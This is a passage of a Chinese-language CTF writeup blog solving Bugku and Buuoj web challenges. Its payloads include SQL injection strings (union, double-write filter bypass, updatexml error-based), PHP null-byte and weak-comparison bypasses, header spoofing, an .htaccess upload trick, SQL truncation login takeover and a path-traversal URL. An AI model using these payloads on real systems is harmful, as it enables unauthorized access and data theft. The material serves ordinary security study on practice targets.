variable">$data</span><span class="token operator">==</span><span class="token string">"bugku is a nice plateform!"</span> <span class="token keyword">and</span> <span class="token variable">$id</span><span class="token operator">==</span><span class="token number">0</span> <span class="token keyword">and</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">5</span> <span class="token keyword">and</span> <span class="token function">eregi</span><span class="token punctuation">(</span><span class="token string">"111"</span><span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"1114"</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token string">"f4l2a3g.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  这里可以直接访问f4l2a3g<span class="token punctuation">.</span>txt得到flag<span class="token punctuation">,</span>但是学习嘛就要学到位<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">print</span> <span class="token string">"never never never give up !!!"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><blockquote><p>stripos() 函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）。</p><p>eregi — 不区分大小写的正则表达式匹配, 函数存在空字符截断漏洞，即参数中的正则表达式或待匹配字符串遇到空字符则截断丢弃后面的数据。</p></blockquote><ul><li><p>因为这里使用了file_get_contents()函数,故$a只能为数据流,这里使用PHP伪协议中的php://input,这个协议可以访问原始请求数据中的只读流。</p></li><li><p>id==0,因为php弱比较特性,当id为字符串就行了</p></li><li><p>这里用截断漏洞就可以匹配了,即111%0044444,因为被截断,111与1114匹配,成功了</p><pre class=" language-php"><code class="language-php"><span class="token function">eregi</span><span class="token punctuation">(</span><span class="token string">"111"</span><span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"1114"</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">4</span></code></pre><p><img src="https://i.loli.net/2019/12/27/HMUXWfEL6sk1BNq.png" alt="5.png"></p><h1 id="字符？正则？"><a href="#字符？正则？" class="headerlink" title="字符？正则？"></a>字符？正则？</h1><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string">'2.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$key</span><span class="token operator">=</span><span class="token string">'KEY{********************************}'</span><span class="token punctuation">;</span><span class="token variable">$IM</span><span class="token operator">=</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/key.*key.{4,7}key:\/.\/(.*key)[a-z][[:punct:]]/i"</span><span class="token punctuation">,</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$match</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$IM</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'key is: '</span><span class="token punctuation">.</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>  1.表达式直接写出来的字符串直接利用，如key<br>  2.“.”代表任意字符<br>  3.“*”代表一个或一序列字符重复出现的次数，即前一个字符重复任意次<br>  4.“/”代表“/”<br>  5.[a-z]代表a-z中的任意一个字符<br>  6.[[:punct:]]代表任意一个字符，包括各种符号<br>  7./i代表大小写不敏感<br>  8.{4-7}代表[0-9]中数字连续出现的次数是4-7次</p><p>  ?id=keykey122223key:/1/keya_   </p><p>  注意,这里最后一个任意符号匹配不要使用”#”</p><blockquote><p>URL 中的 # 本来的用途是跳转到页内锚点。</p></blockquote></li></ul><h1 id="前女友-SKCTF"><a href="#前女友-SKCTF" class="headerlink" title="前女友(SKCTF)@"></a>前女友(SKCTF)@</h1><p>  题目环境出现问题</p><h1 id="login1-SKCTF"><a href="#login1-SKCTF" class="headerlink" title="login1(SKCTF)"></a>login1(SKCTF)</h1><ul><li>SQL约束攻击  <a href="https://www.freebuf.com/articles/web/124537.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/124537.html</a></li></ul><p>注册账号的时候:admin后面多加几个空格,设置密码,然后用这个账号登录,就成功了</p><p>原理:简单来说,SQL查询语句会自动删除后面多余的空格,即”admin     “与”admin”是一样的</p><h1 id="你从哪里来"><a href="#你从哪里来" class="headerlink" title="你从哪里来"></a>你从哪里来</h1><ul><li><p>Referer伪造</p></li><li><p>HTTP Referer是<a href="https://baike.baidu.com/item/header/688992" target="_blank" rel="noopener">header</a>的一部分，当浏览器向web<a href="https://baike.baidu.com/item/服务器" target="_blank" rel="noopener">服务器</a>发送请求的时候，一般会带上Referer，告诉服务器该网页是从哪个页面链接过来的，服务器因此可以获得一些信息用于处理。</p><p>hackbar中选中referer:填写<a href="https://www.google.com" target="_blank" rel="noopener">https://www.google.com</a> 就成功了</p></li></ul><h1 id="md5-collision-NUPT-CTF"><a href="#md5-collision-NUPT-CTF" class="headerlink" title="md5 collision(NUPT_CTF)"></a>md5 collision(NUPT_CTF)</h1><pre class=" language-php"><code class="language-php"><span class="token variable">$md51</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">'QNKCDZO'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$md52</span> <span class="token operator">=</span> @<span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">!=</span> <span class="token string">'QNKCDZO'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$md51</span> <span class="token operator">==</span> <span class="token variable">$md52</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"nctf{*****************}"</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"false!!!"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token string">"please input a"</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>  a=s878926199a</p><h1 id="程序员本地网站"><a href="#程序员本地网站" class="headerlink" title="程序员本地网站"></a>程序员本地网站</h1><p>  XFF伪造:</p><p>  X-Forwarded-For:127.0.0.1</p><p>  XFF的作用是告诉web服务这个请求的原始IP</p><blockquote><p><strong>X-Forwarded-For</strong>（<strong>XFF</strong>）是用来识别通过<a href="https://baike.baidu.com/item/HTTP" target="_blank" rel="noopener">HTTP</a><a href="https://baike.baidu.com/item/代理" target="_blank" rel="noopener">代理</a>或<a href="https://baike.baidu.com/item/负载均衡" target="_blank" rel="noopener">负载均衡</a>方式连接到<a href="https://baike.baidu.com/item/Web服务器" target="_blank" rel="noopener">Web服务器</a>的客户端最原始的<a href="https://baike.baidu.com/item/IP地址" target="_blank" rel="noopener">IP地址</a>的HTTP请求头字段。 <a href="https://baike.baidu.com/item/Squid" target="_blank" rel="noopener">Squid</a> 缓存代理服务器的开发人员最早引入了这一HTTP头字段，并由<a href="https://baike.baidu.com/item/IETF" target="_blank" rel="noopener">IETF</a>在HTTP头字段标准化草案中正式提出。</p></blockquote><h1 id="各种绕过"><a href="#各种绕过" class="headerlink" title="各种绕过"></a>各种绕过</h1><p>  简单代码审计,</p><pre class=" language-php"><code class="language-php"> <span class="token keyword">else</span> <span class="token keyword">if</span>      <span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'uname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'margin'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                     <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Flag: '</span><span class="token punctuation">.</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </code></pre><p>  PHP sha1()函数特性,sha1()和md5()一样不能处理数组,利用数组绕过比较就成功了</p><h1 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h1><blockquote><p>extract() 函数从数组中将变量导入到当前的符号表。</p><p>该函数使用数组键名作为变量名，使用数组键值作为变量值。</p><p>file_get_contents() 函数把整个文件读入一个字符串中。</p></blockquote><pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span><span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$ac</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token variable">$f</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$fn</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$ac</span> <span class="token operator">===</span> <span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token string">"&lt;p>This is flag:"</span> <span class="token punctuation">.</span><span class="token string">" $flag&lt;/p>"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token string">"&lt;p>sorry!&lt;/p>"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span>This is flag<span class="token punctuation">:</span> flag<span class="token punctuation">{</span>3cfb7a90fc0de31<span class="token punctuation">}</span></code></pre><p>  hint是txt 猜测flag.txt,里面的内容为flags</p><p>  ?ac=flags&amp;fn=flag.txt</p><h1 id="细心"><a href="#细心" class="headerlink" title="细心"></a>细心</h1><p>扫描目录,发现robots.txt是robots协议,发现resusl.php,访问得到一个页面<strong>,说不是管理员</strong>,IP被禁了.后面有一段代码if ($_GET[x]==$password) 此处省略1w字</p><p>  ?x=admin 得到flag.要问有什么原理.,我也不知道,可能就是考脑洞,只说一句话,弱口令真可怕</p><h1 id="求getshell"><a href="#求getshell" class="headerlink" title="求getshell"></a>求getshell</h1><p>  是一个文件上传的界面,用bp fuzz一下,发现除了三大图片后缀,以及.htaccess可以传外,其他都不能传</p><p>  因此利用.htaccess文件,可以实现把其他格式的文件以php文件解析.其实这道题,我个人认为是有问题的.</p><p>  后缀为.php5 以及修改Content-Type: mUltipart/form-data; boundary=—————————207312819524324</p><p>  把multipart/form中改为大写就得到flag.</p><p>  个人认为这道题,和大部分的文件上传题不一样-.-</p><h1 id="INSERT-INTO注入-Pyhton"><a href="#INSERT-INTO注入-Pyhton" class="headerlink" title="INSERT INTO注入#Pyhton"></a>INSERT INTO注入#Pyhton</h1><p>题目给出了代码,其中注入语句为,注入的参数为ip</p><pre class=" language-mysql"><code class="language-mysql">$sql="insert into client_ip (ip) values ('$ip')";mysql_query($sql);</code></pre><p>  这里的ip我们可以通修改XFF头实现参数可控,由于没有有用的回显,且无报错,只能通过<strong>基于时间的盲注.</strong></p><p>  题给代码的第十行,把”,”过滤了,则无法使用if语句,因为mysql中的if语句为 if(条件,A,B) 即如果条件为true,则执行A  否则执行B.语句中包含逗号,但是MYSQL中存在替代if语句的case语句.</p><pre class=" language-mysql"><code class="language-mysql">CASE  case_expression   WHEN when_expression_1 THEN commands   WHEN when_expression_2 THEN commands   ...   ELSE commands END CASE;</code></pre><p>  case_expression是任何有效的表达式.将其与when语句中的进行比较,如果二者的值相等,则执行then后面的代码.</p><p>  理解了原理之后,就可以写python脚本来跑数据库这些了,后面补上#</p><h1 id="这是一个神奇的登陆框"><a href="#这是一个神奇的登陆框" class="headerlink" title="这是一个神奇的登陆框"></a>这是一个神奇的登陆框</h1><p>1.使用Sqlmap跑,不得不说sqlmap真香-.-</p><p><img src="https://i.loli.net/2019/12/27/QpNXJZhOsquIYdi.png" alt="7.png"></p><p>2.手动注</p><p>  因为在页面上做太麻烦,故使用bp抓包.先使用单引号’,并没有引发报错,但是使用”提示报错.然后利用正常的注入流程走就行了</p><ul><li>判断回显位置</li></ul><pre class=" language-mysql"><code class="language-mysql">12"union select 1,2.3#</code></pre><p>发现位置为1</p><ul><li><p>查询数据库名</p><pre class=" language-mysql"><code class="language-mysql">12"union select database(),2.3#</code></pre><p>得到,Login_Name:bugkusql1</p></li><li><p>查询表</p><pre class=" language-mysql"><code class="language-mysql">12"union select (select table_name from information_schema.tables  where table_schema=database()limit 0,1),2.3#</code></pre><p>得到,Login_Name:flag1</p></li><li><p>查字段</p></li></ul><pre class=" language-mysql"><code class="language-mysql">12"union select (select table_name from information_schema.columns  where table_name='flag1'  limit 0,1),2.3#</code></pre><p>得到,Login_Name:flag1</p><ul><li>得到最后的flag</li></ul><pre class=" language-mysql"><code class="language-mysql">12"union select (select flag1 from flag1 ),2.3#</code></pre><p>  Login_Name:ed6b28e684817d9efcaf802979e57aea</p><h1 id="多次"><a href="#多次" class="headerlink" title="多次"></a>多次</h1><ul><li>异或注入</li><li>报错注入</li><li>双写bypass</li></ul><p><strong>异或:两个条件为同一个bool值返回false,因此可以用来判断参数过滤</strong></p><p>  页面返回正常说明被过滤</p><p>  第一关:</p><pre class=" language-mysql"><code class="language-mysql">?id=5%27^(length('union')!=0) --+</code></pre><p><img src="https://i.loli.net/2019/12/27/JpYTygVtRL1heKH.png" alt="8.png"></p><p> bp测出来过滤的内容,尝试双写绕过,成功了,然后就是常规的注入流程了.</p><ul><li>判断回显位置</li></ul><pre class=" language-mysql"><code class="language-mysql">?id=-1' ununionion seselectlect 1,2, --+</code></pre><p>  回显为2</p><ul><li>查数据库</li></ul><pre class=" language-mysql"><code class="language-mysql">?id=-1' ununionion seselectlect 1,database() --+</code></pre><p>  得到,web1002-1</p><ul><li>查表名</li></ul><pre class=" language-mysql"><code class="language-mysql">?id=-1' ununionion seselectlect 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema=database()--+</code></pre><p>  得到,flag1,hint</p><ul><li>查字段</li></ul><pre class=" language-mysql"><code class="language-mysql">?id=-1' ununionion seselectlect 1,group_concat(column_name) from infoorrmation_schema.columns where table_name='flag1'--+</code></pre><p>  得到,flag1,address</p><ul><li>查具体的flag1</li></ul><pre class=" language-mysql"><code class="language-mysql">?id=-1' ununionion seselectlect 1,flag1 from flag1 --+</code></pre><p>  得到,<strong>usOwycTju+FTUUzXosjr</strong></p><p>  因为这道题有两个flag,所以查看下个做题的地址</p><pre class=" language-mysql"><code class="language-mysql">?id=-1' ununionion seselectlect 1,address from flag1 --+</code></pre><p>得到,./Once_More.php</p><p>第二关:</p><p>先用?id=1’ 发现报错了.于是此处存在报错注入.</p><p>由于之前的waf是对第一个flag进行的-.- 所以这里用不到双写绕过了</p><ul><li>查表名</li></ul><pre class=" language-mysql"><code class="language-mysql">?id=1' and updatexml(1,concat('~',(select group_concat(table_name) from information_schema.tables where table_schema=database()),'~'),3)--+</code></pre><p>得到class和flag2</p><ul><li>查字段</li></ul><pre class=" language-mysql"><code class="language-mysql">1' and updatexml(1,concat('~',(select group_concat(column_name) from information_schema.columns where table_name='flag2'),'~'),3)--+</code></pre><p>得到flag2和address</p><ul><li>得到具体的flag</li></ul><pre class=" language-mysql"><code class="language-mysql">1' and updatexml(1,concat('~',(select flag2 from flag2),'~'),3)--+</code></pre><p>得到flag{Bugku-sql_6s-2i-4t-bug}</p><p>注意flag全是小写</p><h1 id="PHP-encrypt-1-ISCCCTF-Python"><a href="#PHP-encrypt-1-ISCCCTF-Python" class="headerlink" title="PHP_encrypt_1(ISCCCTF)#Python"></a>PHP_encrypt_1(ISCCCTF)#Python</h1><ul><li>逆向解密算法</li><li>PHP代码审计</li><li>编写脚本的能力</li></ul><p>下载题目附件,得到一个index.php是一个加密字符串的功能,题目中所给的base64的字符串应该是这个代码最后的返回值,要得到flag就需要返算回去fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=</p><p>其中加密代码为</p><pre class=" language-php"><code class="language-php"><span class="token variable">$str</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$char</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>使用python脚本解密</p><h1 id="文件包含2"><a href="#文件包含2" class="headerlink" title="文件包含2@"></a>文件包含2@</h1><p>题目环境有问题,做不来了</p><h1 id="flag-php"><a href="#flag-php" class="headerlink" title="flag.php"></a>flag.php</h1><p>题目提示,hint  这里把hint当做GET的参数即可得到源码</p><pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$cookie</span> <span class="token operator">=</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'ISecer'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'hint'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$cookie</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">"$KEY"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>       <span class="token keyword">echo</span> <span class="token string">"$flag"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span><span class="token delimiter">?></span> 然后一段<span class="token constant">HTML</span>代码<span class="token delimiter">&lt;?php</span><span class="token punctuation">}</span><span class="token variable">$KEY</span><span class="token operator">=</span><span class="token string">'ISecer:www.isecer.com'</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>这里判断如果序列化后的ISecer与下面的key<strong>完全相等(即值和类型都相等</strong>).那么就输出flag.</p><p><strong>由于这里KEY是在序列化之后定义,所以为空 ‘’</strong> 然后得到序列化后的值为</p><p>s:0:””;</p><p>传入Cookie  ISecer=s:0:””; 即可</p><h1 id="sql注入2"><a href="#sql注入2" class="headerlink" title="sql注入2#"></a>sql注入2#</h1><p>第一种做法是从网上看到的源码泄露的方法.使用工具跑出来就行了</p><p>第二种做法是正经的sql注入</p><h1 id="孙xx的博客"><a href="#孙xx的博客" class="headerlink" title="孙xx的博客@"></a>孙xx的博客@</h1><h1 id="Trim的日记本"><a href="#Trim的日记本" class="headerlink" title="Trim的日记本@"></a>Trim的日记本@</h1><p>题目给出的提示,不要一次就放弃.用御剑扫描目录发现show.php</p><p>题目已经坏了</p><h1 id="login2-SKCTF"><a href="#login2-SKCTF" class="headerlink" title="login2(SKCTF)#"></a>login2(SKCTF)#</h1><h1 id="login3-SKCTF"><a href="#login3-SKCTF" class="headerlink" title="login3(SKCTF)#"></a>login3(SKCTF)#</h1><h1 id="文件上传2-湖湘杯"><a href="#文件上传2-湖湘杯" class="headerlink" title="文件上传2(湖湘杯)@"></a>文件上传2(湖湘杯)@</h1><h1 id="江湖魔头"><a href="#江湖魔头" class="headerlink" title="江湖魔头#"></a>江湖魔头#</h1><p>JS代码审计</p><h1 id="login4"><a href="#login4" class="headerlink" title="login4#"></a>login4#</h1><h1 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h1><p>由于后面几道题都是sql注入题.现在我还没有多的对sqli进行深度学习和分类.因此后面几道题我打算到时候补上,包括pyhon</p><p>这里还说明了一个问题.那就是每一个好的学习宽度和深度,以及优秀的写脚本能力,在CTF的道路上是走不远的.</p><p>2019/12/27</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Buuoj CTF  Writeup(1~10)</title>
      <link href="/posts/20191218/"/>
      <url>/posts/20191218/</url>
      
        <content type="html"><![CDATA[<h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><p>打开页面,发现是一个滑鸡,对于这种在<strong><em>页面没有任何代码没有任何提示没有任何条条框框的,右键查看源代码,或者抓包,或者dirscan一下,兴许会有思路</em></strong></p><p>于是右键看源代码,注释中发现<strong>source.php</strong></p><p>进一步又发现了<strong>hint.php</strong> 这个hint是很重要的啊,玩过CTF的都知道,在题目解出来的人很少的时候,出题人都会放hint,所以比赛快结束了就是上分的时候….虽然我没上过分<!-- 哈哈哈哈--></p><p>进入hint.php 页面回显</p><p><strong>flag not here, and flag in ffffllllaaaagggg</strong></p><p>继续看source.php里面的东西,发现了highlight__file</p><a id="more"></a><p>以及file等字符,于是应该有什么关系,看了一下编码格式,是实体编码.</p><p>尝试将代码还原为PHP代码来进行代码审计</p><p>这里其实题目就有提示了,<strong>题目的title为document,而用vscode写html默认的title就是document</strong></p><p>于是把source.php中的代码复制粘贴在body中间,保存为html文件,就可以看见还原的php代码,启用了<strong>白名单检测</strong></p><p>核心代码</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token operator">*</span><span class="token keyword">function</span><span class="token operator">*</span> <span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token comment" spellcheck="true">//静态类的方法参数为一个可变变量*</span>​    <span class="token punctuation">{</span>​      <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"source"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"source.php"</span><span class="token punctuation">,</span><span class="token string">"hint"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"hint.php"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token operator">*</span><span class="token comment" spellcheck="true">//定义了数组whitelist数组成员,键名为source,键值为source.php*</span>​      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token operator">*</span><span class="token comment" spellcheck="true">//检查是否设置了变量page以及page是否为字符串*</span>​        <span class="token keyword">echo</span> <span class="token string">"you can't see it"</span><span class="token punctuation">;</span>​        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>​      <span class="token punctuation">}</span>​      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token operator">*</span><span class="token comment" spellcheck="true">//如果变量page的值在白名单里面就返回true*</span>​        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span></code></pre><pre class=" language-php"><code class="language-php">    <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>                <span class="token variable">$page</span><span class="token punctuation">,</span>                <span class="token number">0</span><span class="token punctuation">,</span>                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token punctuation">.</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token comment" spellcheck="true">//判断? ?之间的内容是否在白名单内,是就返回true,程序继续向下执行</span></code></pre><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>​    <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>​    <span class="token operator">&amp;&amp;</span> emmm<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token punctuation">)</span> <span class="token punctuation">{</span>​    <span class="token keyword">include</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//include是文件包含的敏感词汇</span>​    exit<span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>​    <span class="token keyword">echo</span> <span class="token string">"&lt;br>&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />"</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token delimiter">?></span></code></pre><p>这里判断请求的file参数非空,参数是字符串,调用类中的静态checkfile方法</p><p>如果都满足,就把请求的的ffffllllaaaagggg这个包含出来</p><p>类方法checkFile的参数还是一个可变变量$$page</p><blockquote><p>因此我们可以传递一个白名单里面的hint.php或者source.php来绕过第核心代码2的检测</p><p>这里采用目录遍历的方法,经过测试,发现最小遍历5个目录就行,即5 个../(目录跳转符)</p></blockquote><p>payload:<a href="http://e4e23fca-541e-4715-9075-340ea2d158a3.node3.buuoj.cn/source.php?file=hint.php?../../../../../../../../../ffffllllaaaagggg" target="_blank" rel="noopener">http://e4e23fca-541e-4715-9075-340ea2d158a3.node3.buuoj.cn/source.php?file=hint.php?../../../../../../../../../ffffllllaaaagggg</a></p><h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><p>先输入,1,2,3,发现输入3时就不行了,然后</p><p>1’order by 3# </p><p>error 1054 : Unknown column ‘3’ in ‘order clause’</p><p>说明有三列,再测下注入点,union select 1,2# 回显</p><pre class=" language-php"><code class="language-php"><span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/select|update|delete|drop|insert|where|\./i"</span><span class="token 